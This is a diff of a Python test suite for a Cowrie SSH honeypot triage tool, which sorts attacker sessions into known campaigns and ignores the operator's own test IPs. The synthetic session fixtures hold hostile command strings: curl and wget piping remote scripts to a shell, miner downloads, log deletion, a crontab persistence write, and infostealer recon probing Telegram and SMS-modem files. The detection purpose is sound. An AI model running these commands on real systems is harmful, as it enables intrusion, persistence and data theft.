@@ -80,8 +80,10 @@ def app(tmp_path):
     return d, logs
 
 
-def run(app_dir, logs, script="loader.py", *args):
+def run(app_dir, logs, script="loader.py", *args, extra_env=None):
     env = dict(os.environ, COWRIE_LOG_GLOB=str(logs / "cowrie.json*"), COWRIE_DB=str(app_dir / "data" / "cowrie.db"))
+    env.pop("SELF_IPS", None)
+    env.update(extra_env or {})
     r = subprocess.run([sys.executable, script, *args], cwd=app_dir, env=env, capture_output=True, text=True)
     assert r.returncode == 0, r.stderr
     return r
@@ -171,9 +173,10 @@ def test_realistic_week(app):
     for s in [f"md{i}" for i in range(5)] + [f"mdlong{i}" for i in range(3)]:
         assert (v[s]["label"], v[s]["kind"], v[s]["q"]) == ("mdrfckr_ssh_key_injection", "known_campaign", 0), s
 
-    assert v["drop0"]["label"] == "dropper"
-    assert v["drop0"]["reasons"] == ["dropper", "first_seen_upload:" + DROP_HASH[:16]]
-    assert v["drop1"]["reasons"] == v["drop2"]["reasons"] == ["dropper"]      # still queued: it's a dropper
+    # exact scp playbook = known campaign; a hash we have not seen before is still queued once
+    assert all(v[f"drop{i}"]["label"] == "pi_scp_dropper" for i in range(3))
+    assert v["drop0"]["reasons"] == ["first_seen_upload:" + DROP_HASH[:16]]
+    assert v["drop1"]["q"] == v["drop2"]["q"] == 0
 
     assert v["sshd0"]["reasons"] == ["first_seen_upload:" + SSHD_HASH[:16]] and v["sshd0"]["label"] == "upload"
     assert v["sshd1"]["q"] == v["sshd2"]["q"] == 0
@@ -181,6 +184,8 @@ def test_realistic_week(app):
     assert v["empty0"]["label"] == v["empty1"]["label"] == "empty_upload" and not v["empty0"]["q"]
 
     assert v["smtp0"]["reasons"] == ["first_seen_tunnel:192.0.2.25:25 (smtp)"]
+    assert all(v[f"smtp{i}"]["label"] == "spam_relay" for i in range(5))
+    assert v["goog0"]["label"] == v["goog1"]["label"] == "proxy_abuse"
     assert [v[f"smtp{i}"]["q"] for i in range(1, 5)] == [0, 0, 0, 0]
     assert v["goog0"]["reasons"] == ["first_seen_tunnel:google.com:80"] and v["goog1"]["q"] == 0
     assert v["idle"]["label"] == "no_activity"
@@ -196,7 +201,7 @@ def test_realistic_week(app):
     assert seen["tunnel:192.0.2.25:25"] == 5 and seen["upload:" + DROP_HASH] == 3
     assert [k for k in seen if k.startswith("download:")] == ["download:" + "beef" * 16]  # redirects ignored
     queued = {s for s, x in v.items() if x["q"]}
-    assert queued == {"three_recon", "hostwget", "drop0", "drop1", "drop2", "sshd0", "sshd_new", "smtp0", "goog0",
+    assert queued == {"three_recon", "hostwget", "drop0", "sshd0", "sshd_new", "smtp0", "goog0",
                       "ros_evil", "ros_fetch", "realdl"}
 
 
@@ -311,3 +316,142 @@ def test_performance_13k_sessions(app):
     r = run(app_dir, logs)
     assert "13000 sessions triaged" in r.stdout
     assert (datetime.now(timezone.utc) - t0).total_seconds() < 60
+
+
+# --------------------------------------------------------------------------------------------
+# Rules codified from the first real tier 2 run. Synthetic sessions; the hashes are the real IOCs
+# because the rules match them exactly.
+# --------------------------------------------------------------------------------------------
+PI_SHA = next(iter(triage.PI_SCP_SHA256))
+GO_SHA = next(iter(triage.GO_SSHD_SHA256))
+M = "echo 'SSHOLE_'\"17939932%05d\""
+INFOSTEALER = [
+    "/ip cloud print", "ifconfig", "uname -a", "cat /proc/cpuinfo",
+    "ps | grep '[Mm]iner'", "ps -ef | grep '[Mm]iner'",
+    "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata 2>/dev/null",
+    "ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /usr/bin/qmuxd /dev/modem* 2>&1",
+    "locate D877F783D5D3EF8Cs",
+]
+
+
+def codified_week():
+    L = []
+    pi = ["scp -t /tmp/NeUdHrWl", "cd /tmp && chmod +x NeUdHrWl && bash -c ./NeUdHrWl"]
+    L += session("pi0", pi, uploads=[("NeUdHrWl", PI_SHA)], ip="203.0.113.10")
+    L += session("pi1", pi, uploads=[("NeUdHrWl", PI_SHA)], ip="203.0.113.11")
+    L += session("pi_exec", pi[1:], ip="203.0.113.11")
+    L += session("pi_hashonly", uploads=[("x", PI_SHA)], ip="203.0.113.12")
+    L += session("pi_newhash", pi, uploads=[("NeUdHrWl", "abcd" * 16)])
+    L += session("pi_mismatch", ["scp -t /tmp/AbCdEfGh", "cd /tmp && chmod +x QwErTyUi && bash -c ./QwErTyUi"])
+    L += session("pi_extra", pi + ["wget http://203.0.113.9/m -O /tmp/m"])
+    for i in range(3):
+        L += session(f"go{i}", uploads=[("sshd", GO_SHA)], ip=f"198.51.100.{30 + i}")
+    L += session("go_rename", uploads=[("kworker", GO_SHA)])
+    L += session("go_cmds", ["uname -a", "./sshd"], uploads=[("sshd", GO_SHA)])
+    L += session("sshd_other", uploads=[("sshd", "fc6fa79f" + "5" * 56)])
+    L += session("ss_check", [M % 1, M % 2, "echo 'SSHOLE_B_'\"1793993200003\"; id; echo $?; echo 'SSHOLE_E_'\"1793993200004\""])
+    L += session("ss_drop0", [M % 5, "curl http://203.0.113.80:800/ol.sh | bash", "echo $?", "echo 'SSHOLE_E_'\"1793993200006\""])
+    L += session("ss_drop1", [M % 7, "curl http://203.0.113.80:800/ol.sh | sh"])
+    L += session("ss_newhost", [M % 8, "curl http://198.51.100.80:800/ol.sh | sh"])
+    L += session("ss_other_path", [M % 9, "curl http://203.0.113.80:800/x.sh | sh"])
+    L += session("ss_extra", [M % 10, M % 11, "rm -rf /var/log"])
+    L += session("smtp_new", tunnels=[("198.51.100.25", 587)])
+    L += session("smtp_mixed", tunnels=[("192.0.2.25", 25), ("192.0.2.80", 8080)])
+    L += session("goog_cmd", ["uname -a"], tunnels=[("google.com", 80)])
+    for i in range(3):
+        L += session(f"info{i}", INFOSTEALER, ip=f"192.0.2.{120 + i}")
+    L += session("info_write", INFOSTEALER + ["echo '* * * * * /tmp/x' >> /etc/crontab"])
+    L += session("info_drop", INFOSTEALER + ["wget http://203.0.113.9/miner"])
+    L += session("info_partial", INFOSTEALER[1:])                         # no RouterOS probe
+    return L
+
+
+def test_codified_campaigns(app):
+    app_dir, logs = app
+    write(logs / "cowrie.json", codified_week())
+    run(app_dir, logs)
+    v = verdicts(app_dir)
+    lab = lambda s: (v[s]["label"], v[s]["kind"], v[s]["q"])  # noqa: E731
+
+    assert lab("pi0") == ("pi_scp_dropper", "known_campaign", 1)           # first sighting of the hash
+    assert v["pi0"]["reasons"] == ["first_seen_upload:" + PI_SHA[:16]]
+    assert lab("pi1") == lab("pi_exec") == lab("pi_hashonly") == ("pi_scp_dropper", "known_campaign", 0)
+    assert lab("pi_newhash") == ("pi_scp_dropper", "known_campaign", 1)    # new hash still escalates
+    assert v["pi_newhash"]["reasons"] == ["first_seen_upload:" + "abcd" * 4]
+    assert lab("pi_mismatch")[:2] == lab("pi_extra")[:2] == ("dropper", "unknown")
+    assert v["pi_mismatch"]["q"] == v["pi_extra"]["q"] == 1
+
+    assert lab("go0") == ("go_sshd_upload", "known_campaign", 1)
+    assert lab("go1") == lab("go2") == ("go_sshd_upload", "known_campaign", 0)
+    assert lab("go_rename")[:2] == ("upload", "unknown")
+    assert lab("go_cmds") == ("dropper", "unknown", 1)
+    assert lab("sshd_other") == ("upload", "unknown", 1)                    # other sshd hashes: not reviewed yet
+
+    assert lab("ss_check") == ("sshole_access_check", "known_campaign", 0)
+    assert lab("ss_drop0") == ("sshole_dropper", "known_campaign", 1)
+    assert v["ss_drop0"]["reasons"] == ["first_seen_fetch_url:http://203.0.113.80:800/ol.sh"]
+    assert lab("ss_drop1") == ("sshole_dropper", "known_campaign", 0)
+    assert lab("ss_newhost") == ("sshole_dropper", "known_campaign", 1)    # new staging host
+    assert lab("ss_other_path") == ("dropper", "unknown", 1)
+    assert lab("ss_extra")[1] == "unknown" and v["ss_extra"]["q"] == 1
+
+    assert lab("smtp_new") == ("spam_relay", "known_campaign", 1)
+    assert v["smtp_new"]["reasons"] == ["first_seen_tunnel:198.51.100.25:587 (submission)"]
+    assert lab("smtp_mixed")[:2] == ("direct_tcpip", "unknown")
+    assert lab("goog_cmd")[1] == "unknown"
+
+    assert all(lab(f"info{i}") == ("infostealer_recon", "known_campaign", 0) for i in range(3))
+    assert lab("info_write")[1] == lab("info_partial")[1] == "unknown"
+    assert lab("info_drop") == ("dropper", "unknown", 1)
+
+
+def test_self_test_sessions_are_not_queued_or_counted(app):
+    app_dir, logs = app
+    (app_dir / "data").mkdir()
+    (app_dir / "data" / "self_ips.txt").write_text("# home\n198.51.100.0/28  # dynamic range\nnot-an-ip\n")
+    write(logs / "cowrie.json",
+          session("me_env", ["uname -a", "wget http://203.0.113.9/a.sh | sh"], ip="192.0.2.200")
+          + session("me_file", ["ls", "pwd", "whoami", "cd /home"], uploads=[("x", "beef" * 16)], ip="198.51.100.5")
+          + session("other", ["ls", "pwd", "whoami", "cd /home"], ip="198.51.100.77"))
+    r = run(app_dir, logs, extra_env={"SELF_IPS": "192.0.2.200, 2001:db8::1"})
+    assert "ignoring invalid self IP entry" in r.stderr
+    v = verdicts(app_dir)
+    assert (v["me_env"]["label"], v["me_env"]["kind"], v["me_env"]["q"]) == ("self_test", "noise", 0)
+    assert (v["me_file"]["label"], v["me_file"]["q"]) == ("self_test", 0)
+    assert v["other"]["q"] == 1                                            # same commands, not ours: queued
+    db = sqlite3.connect(app_dir / "data" / "cowrie.db")
+    assert [k for (k,) in db.execute("SELECT key FROM seen_keys")] == ["fp:" + fingerprint.fingerprint(
+        ["ls", "pwd", "whoami", "cd /home"])]                              # nothing from our own sessions
+    r = run(app_dir, logs, "triage.py", "--report", extra_env={"SELF_IPS": "192.0.2.200"})
+    assert "self_test" in r.stdout
+
+
+def test_load_self_ips(tmp_path):
+    f = tmp_path / "self_ips.txt"
+    f.write_text("203.0.113.0/24\n\n# comment only\n")
+    nets = triage.load_self_ips(str(f), {"SELF_IPS": "192.0.2.1 192.0.2.2,"})
+    assert triage.is_self("203.0.113.99", nets) and triage.is_self("192.0.2.2", nets)
+    assert not triage.is_self("192.0.2.3", nets) and not triage.is_self("garbage", nets)
+    assert triage.load_self_ips(str(tmp_path / "missing"), {}) == []
+    assert not triage.is_self("192.0.2.1", [])
+
+
+def test_report_shows_codified_labels_with_severity(app):
+    app_dir, logs = app
+    write(logs / "cowrie.json", codified_week())
+    run(app_dir, logs)
+    out = run(app_dir, logs, "triage.py", "--report").stdout
+    for label, sev in [("pi_scp_dropper", "high"), ("go_sshd_upload", "high"), ("sshole_dropper", "medium"),
+                       ("infostealer_recon", "medium"), ("spam_relay", "medium"), ("sshole_access_check", "low")]:
+        assert any(label in line and sev in line for line in out.splitlines()), label
+
+
+def test_rebuild_with_codified_rules_is_stable(app):
+    app_dir, logs = app
+    write(logs / "cowrie.json", realistic_week() + codified_week())
+    run(app_dir, logs)
+    before = verdicts(app_dir)
+    run(app_dir, logs, "triage.py", "--rebuild")
+    after = verdicts(app_dir)
+    assert {s: (x["label"], x["q"], x["reasons"]) for s, x in before.items()} == \
+           {s: (x["label"], x["q"], x["reasons"]) for s, x in after.items()}
